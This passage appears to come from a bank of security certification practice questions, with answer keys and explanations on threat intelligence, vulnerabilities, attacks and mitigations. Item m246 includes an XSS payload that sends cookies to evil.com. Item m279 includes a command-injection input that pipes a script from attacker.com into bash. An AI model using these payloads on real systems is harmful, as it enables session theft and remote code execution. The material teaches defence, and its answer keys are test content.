      "exp": "Indicators of Compromise (IoCs) are specific, measurable data points associated with malicious activity — IP addresses, domains, URLs, file hashes, registry keys, email addresses. They are used to detect and attribute attacks. TTPs describe the adversary's behaviours and methods at a higher level (MITRE ATT&CK). CVEs identify specific software vulnerabilities."
    },
    {
      "id": "m242",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Threat Intelligence",
      "q": "A threat intelligence analyst receives a report labelled \"TLP:RED\". What does this handling designation mean?",
      "opts": [
        "The information is publicly shareable and should be broadcast widely",
        "The information is for recipient's eyes only — not for distribution to other organisations or individuals",
        "The information can be shared within the recipient's organisation only",
        "The information has been verified by a government agency"
      ],
      "correct": 1,
      "exp": "TLP (Traffic Light Protocol) classifies how threat intelligence can be shared: TLP:CLEAR = public. TLP:GREEN = community. TLP:AMBER = organisation-limited. TLP:AMBER+STRICT = specified recipients only. TLP:RED = eyes only — restricted to the specific recipients named, not for further distribution. TLP is widely used by ISACs (Information Sharing and Analysis Centers) and government agencies."
    },
    {
      "id": "m243",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Threat Intelligence",
      "q": "An analyst receives a structured threat intelligence report containing adversary profiles, TTPs mapped to MITRE ATT&CK, and related IoCs in machine-readable STIX format. Which tier of threat intelligence does this represent?",
      "opts": [
        "Tactical intelligence — IoCs for immediate detection rule creation",
        "Strategic intelligence — high-level trends for executive decision-making",
        "Operational intelligence — detailed information about specific planned attacks",
        "Technical intelligence — low-level technical indicators only"
      ],
      "correct": 0,
      "exp": "Threat intelligence tiers: Strategic: high-level trends, geopolitical context, for executives and board. Operational: specific campaigns, actor motivations, planned attack details. Tactical: TTPs, attack patterns, MITRE ATT&CK mappings, STIX-formatted IoCs for detection rules. Technical: specific IoCs (IPs, hashes) for immediate blocking. The described report — TTPs + STIX IoCs + actor profiles — is primarily tactical."
    },
    {
      "id": "m244",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Vulnerability Types",
      "q": "A vulnerability scanner reports that a web server is running a version of OpenSSL that contains a known vulnerability. The server is on an internal network with no internet exposure. According to risk-based vulnerability management, which factor MOST reduces the effective priority of this finding?",
      "opts": [
        "The age of the vulnerability — older vulnerabilities are less likely to be exploited",
        "The low network exposure — the attack vector is limited to internal network access only, reducing the exploitability",
        "The cost of patching OpenSSL",
        "The vendor's response time to issue a patch"
      ],
      "correct": 1,
      "exp": "CVSS Environmental Metrics allow organisations to adjust the base score based on their specific context. Network exposure is one of the most significant factors — a vulnerability requiring network access from the internet (Attack Vector: Network) is far less exploitable when the system is isolated on an internal network. Risk-based VM considers CVSS Base Score + exploitability context + business criticality."
    },
    {
      "id": "m245",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "A developer writes a function that allocates a 10-byte buffer and copies user input into it without checking the input length. An attacker provides 50 bytes of input. What type of vulnerability exists, and what is the MOST common consequence?",
      "opts": [
        "Integer overflow — the application crashes with an arithmetic error",
        "Stack-based buffer overflow — excess input overwrites adjacent memory, potentially including the return address, enabling arbitrary code execution",
        "Heap overflow — the application allocates extra memory automatically",
        "Format string vulnerability — the attacker can read arbitrary memory"
      ],
      "correct": 1,
      "exp": "A stack-based buffer overflow occurs when more data is written to a stack buffer than it can hold, overwriting adjacent stack memory. The most critical consequence: overwriting the saved return address allows an attacker to redirect execution to attacker-controlled shellcode. Modern mitigations (ASLR, DEP/NX, stack canaries) make exploitation harder but not impossible. This is a classic C/C++ vulnerability; safe languages (Rust, Java, Python) handle bounds checking automatically."
    },
    {
      "id": "m246",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A web application allows users to search products. The search term is reflected in the page URL: /search?q=shoes. An attacker crafts a link: /search?q=fetch(\"https://evil.com?c=\"+document.cookie) and sends it to a victim. The victim's browser executes the script. What attack has occurred, and why is it effective?",
      "opts": [
        "Stored XSS — the payload was stored in the database and served to the victim",
        "Reflected (non-persistent) XSS — the payload in the URL is reflected in the server's response and executed in the victim's browser in the context of the trusted site",
        "DOM-based XSS — the attack modifies the DOM without server involvement",
        "CSRF — the request forges the victim's identity to the server"
      ],
      "correct": 1,
      "exp": "Reflected XSS: the payload is in the URL, reflected by the server in the response, and executed in the victim's browser. It requires social engineering (victim must click the crafted link). Effective because the script runs in the legitimate site's context — accessing cookies, session tokens, and local storage scoped to that domain. Fix: output encoding (HTMLspecialchars). CSP header provides defense-in-depth."
    },
    {
      "id": "m247",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "A web application exposes an API endpoint: GET /api/users/1234/invoices. By changing 1234 to 1235, an unauthenticated user can view another customer's invoices. What vulnerability is this?",
      "opts": [
        "SQL injection — the ID parameter is injected into a query",
        "Insecure Direct Object Reference (IDOR) — user-controllable IDs access other users' objects without authorisation checks",
        "Path traversal — the numeric ID traverses the directory structure",
        "Broken authentication — the session is not validated"
      ],
      "correct": 1,
      "exp": "IDOR (Insecure Direct Object Reference): the application uses a user-supplied value (customer ID) to directly reference an object (invoices) without verifying the requesting user is authorised to access that specific object. Fix: server-side authorisation check on every request: \"does the authenticated user own resource 1235?\" — never rely on the client not guessing IDs. This is OWASP A01:2021 (Broken Access Control)."
    },
    {
      "id": "m248",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A security researcher discovers a race condition in a file permission check in a web application. Between the moment the application checks \"does this user have read permission?\" and the moment it actually reads the file, the researcher substitutes a different file via a symlink. This is an example of:",
      "opts": [
        "Time-of-Use (TOU) attack — the file was used after the check",
        "Time-of-Check to Time-of-Use (TOCTOU) vulnerability — the state changes between when it is checked and when it is used",
        "A privilege escalation via symlink — the symlink elevated the researcher's privileges",
        "An insecure direct object reference — the file path is user-supplied"
      ],
      "correct": 1,
      "exp": "TOCTOU (Time-of-Check to Time-of-Use) is a race condition where the state of a resource changes between its security check and its use. The attacker exploits the window between check and use (the \"race window\"). Common in file system operations, setuid programs, and database transaction handling. Mitigations: atomic operations, file descriptor locking, reduced race windows, using the same reference (file descriptor) for both check and use."
    },
    {
      "id": "m249",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "An employee receives a call from someone claiming to be a fire marshal who needs immediate access to the server room to check sprinkler heads. The caller is insistent about urgency. No fire marshal visit was scheduled. This scenario MOST likely describes:",
      "opts": [
        "A watering hole attack",
        "Vishing combined with pretexting — creating a false urgent scenario to gain physical access",
        "A shoulder surfing attempt",
        "Dumpster diving reconnaissance"
      ],
      "correct": 1,
      "exp": "This is pretexting (fabricating a false scenario — \"fire marshal\" role) combined with urgency (a classic social engineering technique to bypass rational thinking). The attack vector is a phone call (vishing), but the goal is physical access. Countermeasures: verify identity through official channels, never grant access based on urgency alone, document and report suspicious requests."
    },
    {
      "id": "m250",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "Attackers compromise a legitimate software update server for industrial control systems and insert malicious firmware updates that are then automatically applied by thousands of devices globally. This is BEST described as:",
      "opts": [
        "A zero-day attack against the industrial devices",
        "A supply chain attack targeting the software distribution mechanism",
        "A watering hole attack targeting industrial control system administrators",
        "A distributed denial of service attack against update servers"
      ],
      "correct": 1,
      "exp": "Compromising the software distribution supply chain to deliver malicious updates through a trusted channel is a supply chain attack. The victims trust the legitimate update server, so no social engineering of end users is needed. The SolarWinds attack (2020) is a real-world example. Defences: software signing, code integrity verification, network monitoring for unexpected update behaviour."
    },
    {
      "id": "m251",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "An attacker compromises a legitimate website frequented by executives of a specific industry sector and embeds malware that only activates when the visitor's browser reports an IP address from the targeted organisation's range. This targeted passive attack technique is called:",
      "opts": [
        "Spear phishing — targeted email attack",
        "Watering hole attack with target filtering",
        "Business email compromise — impersonating executives",
        "A drive-by download attack on random visitors"
      ],
      "correct": 1,
      "exp": "A watering hole attack compromises websites that the target group frequents, then delivers malware when targets visit. Adding IP-based filtering makes it a targeted watering hole — reducing detection by security researchers who don't come from the target IP range. APT actors use this technique to compromise air-gapped or tightly controlled organisations whose employees browse from specific IP ranges."
    },
    {
      "id": "m252",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "An organisation discovers that an attacker has been accessing their network for 11 months without detection, slowly exfiltrating R&D data. The long dwell time and targeted, patient approach suggests which threat actor category?",
      "opts": [
        "Script kiddie opportunistically exploiting a known vulnerability",
        "Advanced Persistent Threat (APT) — typically state-sponsored or sophisticated criminal group",
        "Hacktivist seeking public attention through disruptive action",
        "Insider threat acting immediately for financial gain"
      ],
      "correct": 1,
      "exp": "APT characteristics: Advanced (sophisticated tools, custom malware), Persistent (long-term — weeks, months, years of dwell time), Threat (targeted, specific objectives — IP theft, espionage). An 11-month undetected presence with targeted data exfiltration is the hallmark of an APT. Script kiddies are opportunistic and noisy. Hacktivists want visibility. Insiders typically act more quickly."
    },
    {
      "id": "m253",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "A user receives an SMS: \"Your bank account has been locked. Click here to verify: http://b4nk-verify.com\". This attack is called:",
      "opts": [
        "Vishing — voice-based phishing",
        "Smishing — SMS-based phishing",
        "Spear phishing — targeted email phishing",
        "Whaling — targeting high-value individuals"
      ],
      "correct": 1,
      "exp": "Smishing (SMS phishing) uses text messages to deliver phishing links or collect sensitive information. The fake domain \"b4nk-verify.com\" is a classic homograph/typosquatting technique. Users often trust SMS more than email and may not inspect URLs as carefully on mobile. Mitigations: verify via official app or phone number, never click SMS links from financial institutions."
    },
    {
      "id": "m254",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "A threat actor sends emails appearing to come from the target company's CEO to the CFO, requesting an urgent wire transfer. The emails pass SPF and DKIM checks. What MOST likely allowed this to happen?",
      "opts": [
        "DMARC is set to p=reject — the emails should have been blocked",
        "The attacker used a look-alike domain (ceo@comp-any.com instead of ceo@company.com) with its own valid SPF and DKIM records — DMARC alignment requires checking the From: header domain matches the authenticated domain",
        "The CFO's email client has a bug",
        "The attacker compromised the company's actual email server"
      ],
      "correct": 1,
      "exp": "SPF and DKIM pass for the look-alike domain (comp-any.com) — because the attacker set up SPF/DKIM for their own domain. DMARC alignment checks whether the authenticated domain (SPF or DKIM) matches the From: header domain. If DMARC is absent or set to p=none on the spoofed domain, this passes. The look-alike domain is different from company.com, so the legitimate company's DMARC policy does not apply. Defences: CEO fraud training, payment verification callbacks, display name monitoring."
    },
    {
      "id": "m255",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "Which characteristic DISTINGUISHES a Trojan from a virus?",
      "opts": [
        "Trojans replicate themselves; viruses do not",
        "Trojans appear as legitimate software to trick users into executing them; viruses attach to legitimate files and spread through file sharing",
        "Trojans only target Windows systems; viruses target all operating systems",
        "Trojans encrypt user files; viruses delete them"
      ],
      "correct": 1,
      "exp": "A Trojan horse disguises itself as legitimate software (a game, utility, cracked software) to trick users into executing it. Unlike viruses, Trojans do NOT self-replicate — they rely on users to install them. Once installed, they may open backdoors, steal credentials, or download additional malware. Viruses attach to legitimate host files and spread when the infected file is shared or executed."
    },
    {
      "id": "m256",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "Malware that encrypts a victim's files and demands payment to provide the decryption key is called:",
      "opts": [
        "Spyware",
        "Adware",
        "Ransomware",
        "Rootkit"
      ],
      "correct": 2,
      "exp": "Ransomware encrypts victim data and extorts payment (typically cryptocurrency) for the decryption key. Modern ransomware groups also exfiltrate data before encrypting (\"double extortion\") and sometimes offer to sell the data if payment is not made (\"triple extortion\"). Ransomware-as-a-Service (RaaS) allows less skilled attackers to deploy sophisticated ransomware in exchange for a percentage of ransom payments."
    },
    {
      "id": "m257",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "A rootkit has been installed on a Linux server. Traditional antivirus scanning finds no malware. What is the MOST likely explanation for why the rootkit evades detection?",
      "opts": [
        "The antivirus signatures are outdated",
        "Rootkits operate at the kernel or hypervisor level and can intercept OS calls — hiding their own processes, files, and network connections from the tools that antivirus uses to scan",
        "The rootkit has encrypted its own files",
        "The antivirus software is not designed to detect Linux malware"
      ],
      "correct": 1,
      "exp": "Kernel-level rootkits modify the operating system kernel (or load malicious kernel modules) to intercept system calls. When antivirus queries \"list all processes\" or \"list all files,\" the rootkit intercepts the system call and filters out its own entries. This is why rootkits are so difficult to detect from within the compromised system. Reliable detection requires booting from a trusted external medium or using hypervisor-level monitoring."
    },
    {
      "id": "m258",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "An attacker establishes persistence on a compromised Windows host by creating a scheduled task named \"WindowsSystemUpdate\" that runs a PowerShell script from a temp directory. What MITRE ATT&CK tactic and technique does this represent?",
      "opts": [
        "Initial Access — T1078 Valid Accounts",
        "Persistence — T1053.005 Scheduled Task/Job",
        "Exfiltration — T1048 Exfiltration Over Alternative Protocol",
        "Defense Evasion — T1036 Masquerading"
      ],
      "correct": 1,
      "exp": "Creating a scheduled task for malicious code is MITRE ATT&CK T1053.005 (Scheduled Task/Job: Scheduled Task) under the Persistence tactic. The misleading task name \"WindowsSystemUpdate\" is also T1036 (Masquerading), but the primary technique here is the scheduled task for persistence. Detection: audit scheduled tasks (Task Scheduler log Event ID 4698), monitor for tasks with suspicious paths or encoded commands."
    },
    {
      "id": "m259",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "An attacker uses the following technique: they send a large number of packets to a target with the source IP spoofed to be the victim's IP, and the destination is a DNS amplification server. The DNS server sends large responses to the victim. What is this attack?",
      "opts": [
        "DNS cache poisoning — modifying DNS records to redirect traffic",
        "Reflection/amplification DDoS — using a third-party server to amplify and reflect traffic toward the victim",
        "DNS hijacking — redirecting DNS queries to malicious resolvers",
        "A SYN flood — exhausting TCP connection state on the target"
      ],
      "correct": 1,
      "exp": "DNS reflection/amplification: attacker sends small DNS queries with spoofed source IP (victim) to open DNS resolvers. The resolver sends large responses to the victim. Amplification factor: DNS responses can be 70x larger than queries. Similar attacks use NTP (amplification ~1000x), SSDP, and Memcached. Mitigations: BCP38 (ingress filtering to prevent IP spoofing), rate-limiting DNS responses, disabling open recursion."
    },
    {
      "id": "m260",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "Which technique involves creating decoy systems that appear to be legitimate targets to lure attackers and gather intelligence about their tactics?",
      "opts": [
        "Sandboxing",
        "Honeypots / deception technology",
        "Network segmentation",
        "Data loss prevention (DLP)"
      ],
      "correct": 1,
      "exp": "Honeypots are decoy systems designed to appear as attractive targets. Attackers who interact with them generate high-confidence alerts (legitimate users have no reason to access honeypots). They gather attacker TTPs, tools, and IP addresses without exposing real systems. A honeynet is a network of honeypots. Honeytokens are fake credentials or data embedded in real systems that trigger alerts when used."
    },
    {
      "id": "m261",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "An organisation implements a web application firewall (WAF) to protect against OWASP Top 10 attacks. A red team finds that Base64-encoding the SQL injection payload bypasses the WAF. Which WAF improvement would MOST effectively address this?",
      "opts": [
        "Increase the WAF's signature update frequency",
        "Enable WAF's normalisation/decoding capabilities so payloads are decoded before pattern matching",
        "Implement rate limiting on the WAF",
        "Replace the WAF with a next-generation firewall (NGFW)"
      ],
      "correct": 1,
      "exp": "WAF evasion through encoding is a known technique. The fix is input normalisation — the WAF decodes Base64, URL-encoding, HTML entities, and other encodings before applying detection rules. This ensures that \"U0VMRUNUICo=\" (Base64 for \"SELECT *\") is evaluated as \"SELECT *\" against detection rules. A WAF that applies rules only to raw input is trivially bypassed by encoding."
    },
    {
      "id": "m262",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Mitigation Techniques",
      "q": "An organisation wants to implement patch management SLAs. According to common industry frameworks, which is the MOST defensible SLA for critical (CVSS 9.0+) vulnerabilities on internet-facing systems?",
      "opts": [
        "Patch within 180 days of vendor release",
        "Patch within 15-30 days of vendor release — with compensating controls implemented within 24-72 hours for actively exploited vulnerabilities",
        "Patch during the next quarterly maintenance window",
        "Patch only when automated testing confirms no compatibility issues"
      ],
      "correct": 1,
      "exp": "Industry standards (PCI DSS, CIS Controls, NIST) recommend patching critical vulnerabilities within 15-30 days on high-risk systems. For actively exploited vulnerabilities (CISA KEV), federal agencies must remediate within 15 days (BOD 22-01). The 24-72 hour compensating control (WAF virtual patch, network restriction) provides protection while formal patching is prepared and tested. 180 days and quarterly windows leave organisations exposed for far too long given real-world exploitation timelines."
    },
    {
      "id": "m263",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "A company implements multi-factor authentication for all VPN connections. An attacker has stolen an employee's username and password. Can the attacker now access the VPN?",
      "opts": [
        "Yes — username and password are sufficient for VPN access",
        "No — MFA requires a second factor the attacker does not possess (assuming they haven't also compromised the second factor)",
        "Yes — VPN authentication only checks usernames and passwords",
        "Yes — MFA only applies to web applications, not VPN"
      ],
      "correct": 1,
      "exp": "MFA significantly raises the bar for attackers — even with stolen credentials, they still need the second factor (OTP from the employee's phone, hardware key, biometric). This is why MFA is one of the most impactful single security controls. Note the caveat: if the attacker also performs a real-time phishing relay capturing the TOTP code, they can bypass TOTP-based MFA — but not FIDO2/phishing-resistant MFA."
    },
    {
      "id": "m264",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "Which control MOST directly prevents an attacker from using a stolen NTLM password hash to authenticate to other Windows systems without knowing the plaintext password?",
      "opts": [
        "Requiring longer passwords (20+ characters)",
        "Enforcing network logon restrictions and disabling NTLM authentication where Kerberos is available, combined with Protected Users group membership",
        "Enabling full disk encryption on all workstations",
        "Implementing account lockout policies"
      ],
      "correct": 1,
      "exp": "Pass-the-Hash (PtH) abuses NTLM authentication by using the hash directly. Mitigations: (1) Disable NTLM where possible — enforce Kerberos. (2) Protected Users security group prevents NTLM authentication for member accounts. (3) Restrict credential exposure (Credential Guard). (4) Tiered admin model prevents hash theft from propagating to high-value targets. Longer passwords don't help — PtH bypasses the password entirely."
    },
    {
      "id": "m265",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Vulnerability Types",
      "q": "An application stores session tokens as a sequential integer in a cookie: session_id=10042. By incrementing the value, an attacker can impersonate other users. What is this vulnerability and how should it be fixed?",
      "opts": [
        "SQL injection — use parameterised queries",
        "Predictable session token / Insecure session management — session tokens must be cryptographically random and of sufficient length (e.g., 128-bit random value from a CSPRNG)",
        "Path traversal — sanitise the cookie value",
        "Broken access control — implement server-side authorisation"
      ],
      "correct": 1,
      "exp": "Sequential or predictable session tokens allow attackers to enumerate valid sessions. The fix: generate session tokens using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) with at least 128 bits of entropy. This makes tokens computationally infeasible to guess. OWASP recommends 64 bytes (512 bits) for session IDs. This is listed under OWASP A07:2021 (Identification and Authentication Failures)."
    },
    {
      "id": "m266",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "A financial institution notices that login attempts to customer accounts use correct username formats and many different passwords across hundreds of accounts, with only 1-3 attempts per account per hour. What type of attack is MOST likely in progress?",
      "opts": [
        "Brute force — trying all combinations against one account",
        "Credential stuffing — using breached username/password pairs",
        "Password spraying — trying common passwords across many accounts",
        "Dictionary attack — using a wordlist against one account"
      ],
      "correct": 2,
      "exp": "Password spraying: few passwords tried against many accounts, staying below per-account lockout thresholds. Typical passwords: seasonal (\"Winter2024!\"), company name, \"Password1\". Differs from credential stuffing (which uses specific breached pairs). Detection: look for distributed low-rate failures across many accounts. Mitigation: MFA, CAPTCHA, impossible travel detection, breach password screening."
    },
    {
      "id": "m267",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A penetration tester discovers that a web application processes XML input and the XML parser has external entity processing enabled. What type of vulnerability exists and what is the risk?",
      "opts": [
        "SQL injection — the XML is passed to a database query",
        "XML External Entity (XXE) injection — attackers can define external entities to read local files, perform SSRF, or cause denial of service",
        "Cross-site scripting — the XML is reflected in the browser",
        "Command injection — XML input is passed to the OS shell"
      ],
      "correct": 1,
      "exp": "XXE (XML External Entity) injection exploits XML parsers that process external entity declarations. An attacker defines:  and uses &xxe; in the XML. The server fetches and includes /etc/passwd in the response. Risks: local file disclosure, SSRF (using \"file://\" or \"http://internal-server\"), DoS (billion laughs attack). Fix: disable external entity processing in the XML parser (implementation varies by language/library)."
    },
    {
      "id": "m268",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Common Threats",
      "q": "Malware that displays unwanted advertisements, typically in a browser, and may redirect web searches to generate advertising revenue for the attacker is called:",
      "opts": [
        "Ransomware",
        "Spyware",
        "Adware",
        "Keylogger"
      ],
      "correct": 2,
      "exp": "Adware displays or redirects to advertisements, typically to generate revenue for the attacker. Some adware is semi-legitimate (bundled with free software with buried consent). Malicious adware installs without consent, resists removal, and may collect browsing data. Spyware collects information. Keyloggers record keystrokes. Ransomware encrypts files."
    },
    {
      "id": "m269",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "An organisation wants to prevent sensitive data from leaving through email attachments. Employees regularly need to email non-sensitive business documents externally. Which technology provides the MOST targeted solution?",
      "opts": [
        "Block all outbound email attachments",
        "Implement S/MIME encryption on all outbound email",
        "Deploy Data Loss Prevention (DLP) with content inspection — blocking or quarantining emails containing sensitive data patterns while allowing normal business communications",
        "Implement email monitoring with manual review of all outbound emails"
      ],
      "correct": 2,
      "exp": "DLP (Data Loss Prevention) inspects content (email body, attachments) against policies — detecting credit card numbers, SSNs, patient health information, or classified keywords. It can block, quarantine, encrypt, or notify based on policy. This allows normal business email to flow while preventing specific sensitive data from leaving. Blocking all attachments breaks business operations. Manual review is not scalable."
    },
    {
      "id": "m270",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Mitigation Techniques",
      "q": "After a penetration test, a finding recommends \"implementing secure headers.\" Which HTTP security header instructs the browser to only connect to the site over HTTPS and to remember this policy for a specified duration, preventing SSL stripping attacks?",
      "opts": [
        "Content-Security-Policy (CSP)",
        "X-Frame-Options",
        "Strict-Transport-Security (HSTS)",
        "X-Content-Type-Options"
      ],
      "correct": 2,
      "exp": "HSTS (HTTP Strict Transport Security): tells browsers to only connect via HTTPS for the duration specified in max-age. After the first HTTPS visit, the browser refuses HTTP connections to that domain — preventing SSL stripping by an on-path attacker. Example: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Preloading submits to browser HSTS preload lists for protection on first visit."
    },
    {
      "id": "m271",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Vulnerability Types",
      "q": "The OWASP Top 10 ranks web application security risks. Which category covers flaws where users can access data or functions beyond their intended authorisation level?",
      "opts": [
        "A03 Injection",
        "A02 Cryptographic Failures",
        "A01 Broken Access Control",
        "A05 Security Misconfiguration"
      ],
      "correct": 2,
      "exp": "OWASP A01:2021 Broken Access Control (moved to #1 from #5 in 2021) covers: IDOR, privilege escalation, accessing other users' accounts, CORS misconfiguration, accessing APIs without authentication, path traversal to access restricted files. It includes both vertical (lower privilege accessing higher privilege functions) and horizontal (same privilege accessing another user's data) access control failures."
    },
    {
      "id": "m272",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "An attacker compromises a server and uses it to mine cryptocurrency, consuming significant CPU and memory resources. Server performance degrades substantially. What type of malware is this?",
      "opts": [
        "Ransomware — the attacker is holding the server hostage",
        "Cryptojacker (cryptomining malware) — unauthorised use of computing resources to mine cryptocurrency",
        "Botnet agent — the server is part of a DDoS network",
        "Wiper — the malware is destroying data"
      ],
      "correct": 1,
      "exp": "Cryptojacking (cryptomining malware) hijacks victim computing resources to mine cryptocurrency (typically Monero, which is harder to trace). Unlike ransomware, victims may not notice immediately — the only symptoms are performance degradation and increased electricity costs. Detection: anomalous CPU/GPU usage, unusual outbound connections to mining pools. Cloud environments with elastic scaling may see significant unexpected costs."
    },
    {
      "id": "m273",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "Which control BEST protects against an attacker who intercepts a legitimate session cookie and uses it to impersonate the authenticated user?",
      "opts": [
        "Longer session timeout periods",
        "Marking session cookies with the Secure flag (HTTPS-only transmission) and HttpOnly flag (JavaScript cannot access) combined with short session lifetime and re-authentication for sensitive operations",
        "Storing session data on the client in a JWT",
        "Using a longer session cookie value"
      ],
      "correct": 1,
      "exp": "Cookie protection: Secure flag: cookie only sent over HTTPS — prevents interception on HTTP. HttpOnly flag: JavaScript cannot access the cookie — prevents XSS-based cookie theft. Short lifetime: limits the window for replay attacks. Re-authentication: for password changes, payments — limits damage from stolen sessions. SameSite flag also protects against CSRF."
    },
    {
      "id": "m274",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A security scanner reports a CVE with CVSS Base Score 7.5 (High), but the EPSS score is 0.0012 (0.12%). An organisation with limited resources must prioritise patches. How should they interpret this?",
      "opts": [
        "Patch immediately — High CVSS always requires immediate remediation",
        "The CVSS Base Score indicates theoretical severity (7.5 = High), but the very low EPSS score (0.12% probability of exploitation in 30 days) suggests this vulnerability is rarely exploited in the wild — lower priority than a Medium CVSS with 45% EPSS",
        "Ignore EPSS — it is not an authoritative source",
        "Escalate to Critical because High CVSS vulnerabilities are always being actively exploited"
      ],
      "correct": 1,
      "exp": "EPSS (Exploit Prediction Scoring System) predicts the probability of exploitation in the next 30 days based on threat intelligence. A 0.12% EPSS means this vulnerability is very unlikely to be exploited imminently, despite a 7.5 CVSS. Risk-based VM uses CVSS + EPSS + KEV status + business context. A medium CVSS (5.0) with 45% EPSS and a public exploit is far more urgent than a high CVSS with 0.12% EPSS."
    },
    {
      "id": "m275",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Common Threats",
      "q": "An attacker sends forged ARP replies to a switch, claiming that the attacker's MAC address corresponds to the gateway's IP address. As a result, other hosts on the network send traffic destined for the gateway through the attacker's machine. This is:",
      "opts": [
        "DHCP starvation — the attacker exhausts the DHCP address pool",
        "ARP poisoning / ARP spoofing — a Layer 2 MitM attack that redirects traffic by corrupting ARP caches",
        "MAC flooding — the attacker overflows the switch's MAC table causing it to broadcast",
        "DNS hijacking — redirecting name resolution to the attacker"
      ],
      "correct": 1,
      "exp": "ARP poisoning: ARP has no authentication — any host can send gratuitous ARP replies claiming any IP-to-MAC mapping. By claiming the gateway's IP maps to the attacker's MAC, the attacker intercepts all outbound traffic (MitM). Mitigation: Dynamic ARP Inspection (DAI) on managed switches validates ARP packets against a DHCP snooping binding table, rejecting spoofed ARP replies."
    },
    {
      "id": "m276",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Mitigation Techniques",
      "q": "An organisation runs a vulnerability scanner but frequently finds the results contain many false positives. Which change to the scanning methodology would MOST significantly reduce false positives?",
      "opts": [
        "Increase scan frequency from weekly to daily",
        "Switch from unauthenticated to credentialed (authenticated) scanning — the scanner can verify whether software is actually installed and patched rather than inferring from banner information",
        "Reduce the scan scope to fewer systems",
        "Use a different vendor's scanner"
      ],
      "correct": 1,
      "exp": "Unauthenticated scans infer software versions from banners, port responses, and behavioural fingerprinting — leading to false positives when the banner doesn't match the actual version. Credentialed (authenticated) scans log in and query the OS directly (registry, package manager, file versions) — producing accurate results about what is actually installed. The trade-off: credentialed scans require managed credentials, which must be secured."
    },
    {
      "id": "m277",
      "ch": "2",
      "difficulty": "medium",
      "topic": "Common Threats",
      "q": "A security analyst observes that a workstation is making connections to multiple internal hosts on port 445 (SMB) in rapid succession at 3 AM, with no scheduled maintenance occurring. What does this MOST likely indicate?",
      "opts": [
        "A legitimate Windows Update checking for patches on network shares",
        "Lateral movement — the compromised workstation is scanning the internal network for SMB targets, consistent with ransomware staging or worm propagation",
        "Normal Windows file sharing behaviour during off-hours backup",
        "A legitimate security scanner running network discovery"
      ],
      "correct": 1,
      "exp": "Rapid port 445 (SMB) connection attempts across multiple internal hosts during off-hours is a classic lateral movement indicator. This pattern is consistent with: ransomware (EternalBlue/WannaCry-style propagation), network worm spreading, or an attacker using tools like Mimikatz + PsExec to move laterally. EternalBlue exploits SMBv1. Response: immediately isolate the workstation, capture memory, review Event Logs (EventID 7045, 4688)."
    },
    {
      "id": "m278",
      "ch": "2",
      "difficulty": "easy",
      "topic": "Mitigation Techniques",
      "q": "Which email security mechanism allows a domain owner to specify that emails failing SPF or DKIM checks should be rejected at the receiving server?",
      "opts": [
        "DNSSEC",
        "DMARC with p=reject",
        "SPF with ~all (softfail) qualifier",
        "DKIM with a 2048-bit key"
      ],
      "correct": 1,
      "exp": "DMARC (Domain-based Message Authentication, Reporting, and Conformance) policy p=reject instructs receiving mail servers to reject emails that fail both SPF and DKIM alignment. Progression: p=none (monitor only), p=quarantine (mark as spam), p=reject (block). DMARC also enables reporting: receiving servers send aggregate (rua=) and forensic (ruf=) reports back to the domain owner, revealing who is sending email on their behalf."
    },
    {
      "id": "m279",
      "ch": "2",
      "difficulty": "hard",
      "topic": "Vulnerability Types",
      "q": "A developer uses the following code: system(\"cat \" + user_input); where user_input comes from a web form. An attacker enters: \"report.txt; curl http://attacker.com/steal.sh | bash\". What vulnerability is this and what is the correct fix?",
      "opts": [
        "SQL injection — use prepared statements",
        "OS command injection — avoid shell execution entirely; if unavoidable, use allowlisted inputs or language-native file reading APIs that do not invoke a shell",
        "Path traversal — validate the file path",
        "XSS — encode the user input before display"
      ],
      "correct": 1,
      "exp": "OS command injection: user input is passed to a shell command without sanitisation. The semicolon terminates the cat command and the attacker's curl command executes. Fix: avoid shell execution entirely — use language-native APIs (e.g., Python's open() for file reading). If shell execution is truly necessary: use an allowlist of permitted values, never concatenate user input. Shell metacharacters (;, |, &, `, $, >) must never reach the shell."
    },
    {
      "id": "m280",
      "ch": "2",
